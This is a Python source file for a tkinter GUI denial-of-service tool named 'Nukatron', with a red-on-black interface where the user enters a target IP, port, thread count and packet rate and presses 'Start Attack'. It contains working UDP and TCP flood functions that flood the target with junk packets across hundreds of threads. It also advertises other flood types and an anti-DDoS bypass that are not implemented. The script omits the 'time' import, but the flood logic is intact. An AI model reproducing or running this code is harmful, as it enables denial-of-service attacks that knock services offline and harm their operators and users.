import tkinter as tk
from tkinter import messagebox
import socket
import threading

def udp_flood(target_ip, port, duration, packet_rate):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b'X' * 1024
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(data, (target_ip, int(port)))
        time.sleep(1 / packet_rate)

def tcp_flood(target_ip, port, duration, threads):
    def tcp_attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((target_ip, int(port)))
            end_time = time.time() + duration
            while time.time() < end_time:
                sock.send(b'X' * 1024)
        except:
            pass
        finally:
            sock.close()

    for _ in range(int(threads)):
        threading.Thread(target=tcp_attack).start()

def start_attack():
    target_ip = entry_ip.get()
    target_url = entry_url.get()
    attack_type = var_attack_type.get()
    duration = int(entry_duration.get())
    port = entry_port.get()
    threads = entry_threads.get()
    packet_rate = int(entry_packet_rate.get())
    speed = speed_slider.get()
    bypass_all = bypass_all_var.get()

    if attack_type == "UDP Flood":
        threading.Thread(target=udp_flood, args=(target_ip, port, duration, packet_rate)).start()
    elif attack_type == "TCP Flood":
        threading.Thread(target=tcp_flood, args=(target_ip, port, duration, threads)).start()
    # Add other attack types here

    messagebox.showinfo(
        "Attack Started",
        f"Attack: {attack_type}\n"
        f"Target IP: {target_ip}\n"
        f"Target URL: {target_url}\n"
        f"Port: {port}\n"
        f"Duration: {duration}s\n"
        f"Threads: {threads}\n"
        f"Packet Rate: {packet_rate}\n"
        f"Speed Level: {speed}\n"
        f"Bypass Anti DDoS/DoS: {bypass_all}"
    )

root = tk.Tk()
root.title("Nukatron [WIP]")
root.geometry("600x600")  # Bigger window
root.configure(bg="black")

label_style = {"bg": "black", "fg": "red", "font": ("MS Sans Serif", 10, "bold")}

# ============================
# USER SECTION (IP)
# ============================
user_frame = tk.LabelFrame(root, text="Kukatron Remade by moon", bg="black", fg="red",
                           font=("MS Sans Serif", 10, "bold"), bd=2, relief="sunken",
                           highlightbackground="red", highlightthickness=2)
user_frame.place(x=20, y=20, width=260, height=120)

tk.Label(user_frame, text="Target IP:", **label_style).grid(row=0, column=0, sticky="w", pady=5)
entry_ip = tk.Entry(user_frame, width=25, bg="#1A0000", fg="red", insertbackground="red")
entry_ip.grid(row=1, column=0, pady=5)

# ============================
# SITE SECTION (URL)
# ============================
site_frame = tk.LabelFrame(root, text="Site Target", bg="black", fg="red",
                           font=("MS Sans Serif", 10, "bold"), bd=2, relief="sunken",
                           highlightbackground="red", highlightthickness=2)
site_frame.place(x=320, y=20, width=260, height=120)

tk.Label(site_frame, text="Target URL:", **label_style).grid(row=0, column=0, sticky="w", pady=5)
entry_url = tk.Entry(site_frame, width=25, bg="#1A0000", fg="red", insertbackground="red")
entry_url.grid(row=1, column=0, pady=5)

# ============================
# ATTACK SETTINGS
# ============================
settings_frame = tk.Frame(root, bg="black", bd=2, relief="sunken",
                          highlightbackground="red", highlightthickness=2)
settings_frame.place(x=20, y=160, width=560, height=300)

tk.Label(settings_frame, text="Attack Type:", **label_style).grid(row=0, column=0, sticky="w", pady=5)
var_attack_type = tk.StringVar(value="UDP Flood")
attack_menu = tk.OptionMenu(
    settings_frame,
    var_attack_type,
    "UDP Flood",
    "TCP Flood",
    "HTTP Flood",
    "SYN Flood",
    "ICMP Flood",
    "Ping Type Spam Ping"
)
attack_menu.config(bg="#330000", fg="red", activebackground="red", activeforeground="black")
attack_menu.grid(row=0, column=1, pady=5)

# ============================
# BYPASS ANTI DDoS/DoS
# ============================
bypass_frame = tk.Frame(settings_frame, bg="black")
bypass_frame.grid(row=1, column=0, columnspan=2, pady=5)
bypass_all_var = tk.BooleanVar(value=False)
bypass_check = tk.Checkbutton(bypass_frame, text="Bypass Anti DDoS/DoS", variable=bypass_all_var,
                              bg="black", fg="red", activebackground="black", activeforeground="red",
                              font=("MS Sans Serif", 10, "bold"))
bypass_check.pack(side="left")

# ============================
# DURATION
# ============================
duration_frame = tk.Frame(settings_frame, bg="black")
duration_frame.grid(row=2, column=0, columnspan=2, pady=5)
tk.Label(duration_frame, text="Duration (s):", **label_style).pack(side="left")
entry_duration = tk.Entry(duration_frame, width=10, bg="#1A0000", fg="red", insertbackground="red")
entry_duration.pack(side="left")

# ============================
# PORT
# ============================
port_frame = tk.Frame(settings_frame, bg="black")
port_frame.grid(row=3, column=0, columnspan=2, pady=5)
tk.Label(port_frame, text="Port:", **label_style).pack(side="left")
entry_port = tk.Entry(port_frame, width=10, bg="#1A0000", fg="red", insertbackground="red")
entry_port.insert(0, "80")
entry_port.pack(side="left")

# ============================
# THREADS
# ============================
threads_frame = tk.Frame(settings_frame, bg="black")
threads_frame.grid(row=4, column=0, columnspan=2, pady=5)
tk.Label(threads_frame, text="Threads:", **label_style).pack(side="left")
entry_threads = tk.Entry(threads_frame, width=10, bg="#1A0000", fg="red", insertbackground="red")
entry_threads.insert(0, "500")
entry_threads.pack(side="left")

# ============================
# PACKET RATE
# ============================
packet_rate_frame = tk.Frame(settings_frame, bg="black")
packet_rate_frame.grid(row=5, column=0, columnspan=2, pady=5)
tk.Label(packet_rate_frame, text="Packet Rate:", **label_style).pack(side="left")
entry_packet_rate = tk.Entry(packet_rate_frame, width=10, bg="#1A0000", fg="red", insertbackground="red")
entry_packet_rate.insert(0, "10000")
entry_packet_rate.pack(side="left")

# ============================
# SPEED
# ============================
speed_frame = tk.Frame(settings_frame, bg="black")
speed_frame.grid(row=6, column=0, columnspan=2, pady=5)
tk.Label(speed_frame, text="Speed:", **label_style).pack(side="left")
speed_slider = tk.Scale(speed_frame, from_=1, to=4, orient="horizontal",
                        bg="black", fg="red", troughcolor="red",
                        highlightbackground="red", highlightthickness=1,
                        font=("MS Sans Serif", 10, "bold"))
speed_slider.set(4)  # Default to max (Super Fast)
speed_slider.pack(side="left")

# ============================
# START BUTTON
# ============================
start_btn = tk.Button(
    root,
    text="Start Attack",
    width=30,
    bg="red",
    fg="black",
    relief="raised",
    font=("MS Sans Serif", 11, "bold"),
    activebackground="#FF4444",
    activeforeground="black",
    command=start_attack
)
start_btn.place(x=180, y=480)
